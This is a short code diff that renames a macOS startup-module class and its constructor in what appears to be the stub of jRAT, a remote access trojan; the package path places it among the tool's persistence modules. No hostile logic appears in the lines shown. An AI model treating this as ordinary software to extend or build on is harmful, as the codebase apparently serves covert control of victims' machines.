@@ -3,9 +3,9 @@ package io.jrat.stub.modules.startup;
 import java.util.Map;
 import oslib.OperatingSystem;
 
-public class OSXToolBarStartupModule extends StartupModule {
+public class MacOSToolBarStartupModule extends StartupModule {
 	
-	public OSXToolBarStartupModule(Map<String, String> config) {
+	public MacOSToolBarStartupModule(Map<String, String> config) {
 		super(config);
 	}
 	
